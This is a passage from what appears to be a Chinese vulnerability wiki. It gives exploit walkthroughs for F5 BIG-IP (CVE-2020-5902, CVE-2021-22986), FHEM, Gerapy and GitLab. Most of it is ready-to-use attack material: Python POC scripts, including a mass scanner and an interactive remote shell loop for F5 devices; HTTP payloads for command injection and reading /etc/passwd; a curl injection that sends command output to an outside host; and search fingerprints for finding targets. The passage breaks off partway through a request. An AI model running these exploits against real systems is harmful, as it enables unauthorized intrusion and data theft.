","date":"0001-01-01","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-5902/:3:0","tags":null,"title":"","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-5902/"},{"categories":null,"content":"漏洞复现 在 tmshCmd 的 service方法处理请求的时候，未对command 参数进行处理，直接调用 WorkspaceUtils.runTmshCommand(cmd, request); 方法执行命令，限制了执行delete,create,list,modify。 if (\"POST\".equalsIgnoreCase(request.getMethod())) { String[] cmdArray = command.split(\" \"); String operation = cmdArray[0]; String module = cmdArray[2]; if (!ShellCommandValidator.checkForBadShellCharacters(command) \u0026\u0026 (operation.equals(\"create\") || operation.equals(\"delete\") || operation.equals(\"list\") || operation.equals(\"modify\")) \u0026\u0026 WHITELISTED_TMSH_MODULES.contains(module)) { try { String[] args = new String[]{command}; Result result = Syscall.callElevated(Syscall.TMSH, args); output = result.getOutput(); error = result.getError(); } catch (CallException var11) { logger.error(NLSEngine.getString(\"ilx.workspace.error.TmshCommandFailed\") + \": \" + var11.getMessage()); error = var11.getMessage(); } } else { error = NLSEngine.getString(\"ilx.workspace.error.RejectedTmshCommand\"); } 在 fileRead 的 service方法处理请求的时候，未对 fileName 参数进行处理，直接调用 WorkspaceUtils.readFile(fileName); 方法，进行文件读取。 在 fileSave 的 service方法处理请求的时候，未对 fileName，content 参数进行处理，直接调用 WorkspaceUtils.saveFile(request); 方法，进行文件上传。 详情利用方式 https://github.com/jas502n/CVE-2020-5902 详情利用方式 https://github.com/wx3514/CVE-2020-5902/blob/master/CVE-2020-5902.md 读取文件 http://xxx.xxx.xxx.xxx/tmui/login.jsp/ ..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd 写入文件 http://xxx.xxx.xxx.xxx/tmui/login.jsp/ ..;/tmui/locallb/workspace/fileSave.jsp POST: fileName=/tmp/test.txt\u0026content=test 读取文件 /tmp/test 成功写入文件 ","date":"0001-01-01","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-5902/:4:0","tags":null,"title":"","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-5902/"},{"categories":null,"content":"漏洞POC import requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: F5 BIG-IP \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2020-5902.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Language\":\"zh-CN,zh;q=0.9\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=version_url, timeout=10, verify=False, headers=headers) if \"output\" in response.text: print(\"\\033[32m[o] 目标 {} 存在漏洞，响应为:\\n{}\\033[0m\".format(target_url, json.loads(response.text)[\"output\"])) else: print(\"\\033[31m[x] 目标漏洞无法利用 \\033[0m\") except Exception as e: print(\"\\033[31m[x] 目标漏洞无法利用 ,{}\\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-5902/:5:0","tags":null,"title":"","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-5902/"},{"categories":null,"content":"参考文章 https://mochazz.github.io/2020/07/11/F5-BIG-IP 未授权RCE(CVE-2020-5902)/#未授权命令执行 ","date":"0001-01-01","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-5902/:6:0","tags":null,"title":"","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-5902/"},{"categories":null,"content":"F5 BIG-IP 远程代码执行漏洞 CVE-2021-22986 ","date":"0001-01-01","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-22986/:0:0","tags":null,"title":"","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-22986/"},{"categories":null,"content":"漏洞描述 F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。 近日，F5发布了F5 BIG-IQ/F5 BIG-IP 代码执行，代码执行的风险声明，F5安全公告更新了BIG-IP，BIG-IQ中的多个严重漏洞。建议广大用户及时将f5 big-iq,f5 big-ip升级到最新版本，避免遭到攻击。 ","date":"0001-01-01","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-22986/:1:0","tags":null,"title":"","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-22986/"},{"categories":null,"content":"漏洞影响 F5 BIG-IP 16.x: 16.1.0.3 F5 BIG-IP 15.x: 15.1.0.4 F5 BIG-IP 14.x: 14.1.2.6 F5 BIG-IP 13.x: 13.1.3.4 F5 BIG-IP 12.x: 12.1.5.2 F5 BIG-IP 11.x: 11.6.5.2 ","date":"0001-01-01","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-22986/:2:0","tags":null,"title":"","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-22986/"},{"categories":null,"content":"网络测绘 icon_hash=\"-335242539\" ","date":"0001-01-01","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-22986/:3:0","tags":null,"title":"","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-22986/"},{"categories":null,"content":"漏洞复现 访问登录页面如下 发送请求包 POST /mgmt/tm/util/bash HTTP/1.1 Host: xxx.xxx.xxx.xxx:8443 Connection: close Content-Length: 41 Cache-Control: max-age=0 Authorization: Basic YWRtaW46QVNhc1M= X-F5-Auth-Token: Upgrade-Insecure-Requests: 1 Content-Type: application/json {\"command\":\"run\",\"utilCmdArgs\":\"-c id\"} 成功执行命令 id ","date":"0001-01-01","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-22986/:4:0","tags":null,"title":"","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-22986/"},{"categories":null,"content":"漏洞POC 批量测试 import requests import sys import random import re import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: F5 BIG-IP \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mFile \u003e\u003e\u003e ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\": \"Basic YWRtaW46QVNhc1M=\", \"X-F5-Auth-Token\": \"\", \"Content-Type\": \"application/json\" } data = '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}' try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=2) if \"commandResult\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞,响应为:{} \\033[0m\".format(target_url, json.loads(response.text)[\"commandResult\"])) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"https://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] 请求报错 \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile \u003e\u003e\u003e \\033[0m\")) Scan(file_name) 命令执行 import requests import sys import random import re import base64 import time import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: F5 BIG-IP \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\": \"Basic YWRtaW46QVNhc1M=\", \"X-F5-Auth-Token\": \"\", \"Content-Type\": \"application/json\" } data = '''{\"command\":\"run\",\"utilCmdArgs\":\"-c 'cat /etc/passwd'\"}''' try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) if 'root' in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞,响应为:{} \\033[0m\".format(target_url, json.loads(response.text)[\"commandResult\"])) while True: Cmd = str(input(\"\\033[35mCmd \u003e\u003e\u003e \\033[0m\")) POC_2(target_url, Cmd) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url), e) def POC_2(target_url, Cmd): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\": \"Basic YWRtaW46QVNhc1M=\", \"X-F5-Auth-Token\": \"\", \"Content-Type\": \"application/json\" } Cmd = \"'\" + Cmd + \"'\" data = '{\"command\":\"run\",\"utilCmdArgs\":\"-c %s\"}' % Cmd try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[32m{} \\033[0m\".format(json.loads(response.text)[\"commandResult\"])) except Exception as e: print(\"\\033[31m[x] 命令执行失败 \\033[0m\".format(target_url), e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-22986/:5:0","tags":null,"title":"","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-22986/"},{"categories":null,"content":"Fhem FileLog_logWrapper 任意文件读取漏洞 CVE-2020-19360 ","date":"0001-01-01","objectID":"/fhem-filelog_logwrapper-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-19360/:0:0","tags":null,"title":"","uri":"/fhem-filelog_logwrapper-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-19360/"},{"categories":null,"content":"漏洞描述 FHEM在6.0版本中存在文件包含漏洞，该漏洞源于允许FHEM/FileLog_logWrapper file参数允许攻击者包含文件，攻击者可以利用此漏洞导致敏感信息泄露。 ","date":"0001-01-01","objectID":"/fhem-filelog_logwrapper-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-19360/:1:0","tags":null,"title":"","uri":"/fhem-filelog_logwrapper-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-19360/"},{"categories":null,"content":"漏洞影响 FHEM 6.0 ","date":"0001-01-01","objectID":"/fhem-filelog_logwrapper-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-19360/:2:0","tags":null,"title":"","uri":"/fhem-filelog_logwrapper-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-19360/"},{"categories":null,"content":"网络测绘 title==\"Home, Sweet Home\" ","date":"0001-01-01","objectID":"/fhem-filelog_logwrapper-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-19360/:3:0","tags":null,"title":"","uri":"/fhem-filelog_logwrapper-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-19360/"},{"categories":null,"content":"漏洞复现 主页面 验证POC /fhem/FileLog_logWrapper?dev=Logfile\u0026file=%2fetc%2fpasswd\u0026type=text ","date":"0001-01-01","objectID":"/fhem-filelog_logwrapper-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-19360/:4:0","tags":null,"title":"","uri":"/fhem-filelog_logwrapper-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-19360/"},{"categories":null,"content":"Gerapy clone 后台远程命令执行漏洞 CVE-2021-32849 ","date":"0001-01-01","objectID":"/gerapy-clone-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-32849/:0:0","tags":null,"title":"","uri":"/gerapy-clone-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-32849/"},{"categories":null,"content":"漏洞描述 近日，我司应急团队监测到关于Gerapy 0.9.6和之前的版本中存在注入漏洞，漏洞编号：CVE-2021-32849，该漏洞源于程序没有正确清理通过project_clone端点传递给Popen的输入，攻击者可利用该漏洞执行任意命令。 ","date":"0001-01-01","objectID":"/gerapy-clone-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-32849/:1:0","tags":null,"title":"","uri":"/gerapy-clone-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-32849/"},{"categories":null,"content":"漏洞影响 Gerapy \u003c= 0.9.6 ","date":"0001-01-01","objectID":"/gerapy-clone-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-32849/:2:0","tags":null,"title":"","uri":"/gerapy-clone-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-32849/"},{"categories":null,"content":"网络测绘 title=\"Gerapy\" ","date":"0001-01-01","objectID":"/gerapy-clone-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-32849/:3:0","tags":null,"title":"","uri":"/gerapy-clone-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-32849/"},{"categories":null,"content":"漏洞复现 登录页面 出现漏洞的文件为 gerapy/server/core/views.py @api_view(['POST']) @permission_classes([IsAuthenticated]) def project_clone(request): \"\"\" clone project from github :param request: request object :return: json \"\"\" if request.method == 'POST': data = json.loads(request.body) address = data.get('address') if not address.startswith('http'): return JsonResponse({'status': False}) address = address + '.git' if not address.endswith('.git') else address cmd = 'git clone {address} {target}'.format(address=address, target=join(PROJECTS_FOLDER, Path(address).stem)) logger.debug('clone cmd %s', mcd) p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) stdout, stderr = bytes2str(p.stdout.read()), bytes2str(p.stderr.read()) logger.debug('clone run result %s', stdout) if stderr: logger.error(stderr) return JsonResponse({'status': True}) if not stderr else JsonResponse({'status': False}) 这里可以看到 address参数 为可控参数，拼接到 cmd中使用 Popen命令执行，构造请求包 POST /api/project/clone HTTP/1.1 Host: Content-Length: 61 Accept: application/json, text/plain, */* Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Content-Type: application/json;charset=UTF-8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close {\"address\":\"http://127.0.0.1;curl xxx.xxx.xxx.xxx:9999?`id`\"} ","date":"0001-01-01","objectID":"/gerapy-clone-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-32849/:4:0","tags":null,"title":"","uri":"/gerapy-clone-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-32849/"},{"categories":null,"content":"Gerapy parse 后台远程命令执行漏洞 ","date":"0001-01-01","objectID":"/gerapy-parse-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/gerapy-parse-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Gerapy gerapy/server/core/views.py 中的方法存在任意命令执行，攻击者登录后台后发送特定的请求包即可利用漏洞 ","date":"0001-01-01","objectID":"/gerapy-parse-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/gerapy-parse-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Gerapy \u003c= 0.9.7 ","date":"0001-01-01","objectID":"/gerapy-parse-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/gerapy-parse-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Gerapy\" ","date":"0001-01-01","objectID":"/gerapy-parse-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/gerapy-parse-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 出现漏洞的文件为 gerapy/server/core/views.py 构造请求包测试命令执行 POST /api/project/1/parse HTTP/1.1 Host: Pragma: no-cache Cache-Control: no-cache Accept: application/json, text/plain, */* Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Content-Length: 18 {\"spider\":\";`id`\"} ","date":"0001-01-01","objectID":"/gerapy-parse-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/gerapy-parse-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Gerapy read 后台任意文件读取漏洞 ","date":"0001-01-01","objectID":"/gerapy-read-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/gerapy-read-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Gerapy gerapy/server/core/views.py 中的 project_file_read 方法存在任意文件读取，攻击者登录后台后发送特定的请求包即可利用漏洞 ","date":"0001-01-01","objectID":"/gerapy-read-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/gerapy-read-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Gerapy \u003c= 0.9.6 ","date":"0001-01-01","objectID":"/gerapy-read-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/gerapy-read-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Gerapy\" ","date":"0001-01-01","objectID":"/gerapy-read-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/gerapy-read-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 出现漏洞的文件为 gerapy/server/core/views.py @api_view(['POST']) @permission_classes([IsAuthenticated]) def project_file_read(request): \"\"\" get content of project file :param request: request object :return: file content \"\"\" if request.method == 'POST': data = json.loads(request.body) path = join(data['path'], data['label']) # binary file with open(path, 'rb') as f: return HttpResponse(f.read().decode('utf-8')) 参数 path 和 label 都为用户可控变量，登录后构造请求包 POST /api/project/file/read HTTP/1.1 Host: Content-Length: 35 Accept: application/json, text/plain, */* Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Content-Type: application/json;charset=UTF-8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close {\"path\":\"/etc/\", \"label\":\"passwd\"} ","date":"0001-01-01","objectID":"/gerapy-read-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/gerapy-read-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"GitLab Graphql邮箱信息泄露漏洞 CVE-2020-26413 ","date":"0001-01-01","objectID":"/gitlab-graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-26413/:0:0","tags":null,"title":"","uri":"/gitlab-graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-26413/"},{"categories":null,"content":"漏洞描述 GitLab中存在Graphql接口 输入构造的数据时会泄露用户邮箱和用户名 ","date":"0001-01-01","objectID":"/gitlab-graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-26413/:1:0","tags":null,"title":"","uri":"/gitlab-graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-26413/"},{"categories":null,"content":"漏洞影响 GitLab 13.4 - 13.6.2 ","date":"0001-01-01","objectID":"/gitlab-graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-26413/:2:0","tags":null,"title":"","uri":"/gitlab-graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-26413/"},{"categories":null,"content":"网络测绘 title=\"GitLab\" ","date":"0001-01-01","objectID":"/gitlab-graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-26413/:3:0","tags":null,"title":"","uri":"/gitlab-graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-26413/"},{"categories":null,"content":"漏洞复现 漏洞来源为 hackone上的一篇公开报告 https://gitlab.com/gitlab-org/gitlab/-/issues/244275 意思为当使用构造的语句在接口查询时会返回邮箱信息，如图 访问 URL http://xxx.xxx.xxx.xxx/-//graphql-explorer Gitlab本身不允许获取账号邮箱信息，这里通过调用 Graphql 用户名查询造成了邮箱泄露漏洞 查看完报告后发现漏洞利用需要有账号用户名，在不知道的情况下无法获取邮箱，在Graphql官网 查看得知可以通过另一个构造的语句一次性返回所有的用户名和邮箱 发包调用了 /api/graphql 接口发送数据 完整数据包为 POST /api/graphql 